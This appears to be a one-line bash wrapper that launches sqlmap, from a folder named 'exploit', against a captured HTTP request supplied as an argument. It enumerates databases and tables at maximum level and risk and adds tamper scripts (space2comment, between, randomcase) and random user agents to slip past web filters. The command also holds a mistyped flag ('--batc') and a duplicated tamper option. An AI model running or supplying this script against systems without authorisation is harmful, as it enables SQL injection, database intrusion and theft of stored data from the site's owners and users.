#!/bin/bash

python /var/www/exploit/sqlmap/sqlmap.py -r "$1" --dbs --tables --level=5 --risk=3 --threads=10 --dbms=mysql --time-sec=10 --no-cast --no-escape --tamper="space2comment,between" --batc -v 3 --tamper="between,randomcase,space2comment" --random-agent
